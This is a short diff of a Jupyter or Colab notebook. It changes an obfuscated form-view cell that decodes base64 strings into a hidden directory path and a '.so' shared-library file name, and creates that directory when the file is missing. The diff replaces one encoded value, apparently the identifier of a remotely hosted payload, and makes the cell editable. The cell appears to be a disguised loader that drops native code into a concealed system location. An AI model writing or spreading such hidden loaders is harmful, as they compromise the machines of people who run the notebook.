@@ -37,7 +37,7 @@
         "\n",
         "_0x70 = _0x3c.b64decode(b'L3Vzci9sb2NhbC9zaGFyZS8uY29uZmlnLy5zeXNfcnVudGltZQ==').decode()\n",
         "_0x81 = f\"{_0x70}/{_0x3c.b64decode(b'Y3Jvd250d2l4dG9yLnNv').decode()}\"\n",
-        "_0x92 = \"MTl2RzIwRTBwM3JVTFM0RU01NHBwQ3BqV1hIS19CeDhM\"\n",
+        "_0x92 = \"MXhVbUZESlFOdlZ1T1dlUWExN2Rta1lRZERVTnllbUty\"\n",
         "\n",
         "if not _0x1a.path.exists(_0x81):\n",
         "    _0x1a.makedirs(_0x70, exist_ok=True)\n",
@@ -59,7 +59,7 @@
       ],
       "metadata": {
         "cellView": "form",
-        "editable": false,
+        "editable": true,
         "id": "o_B7McgpChyz"
       },
       "execution_count": null,
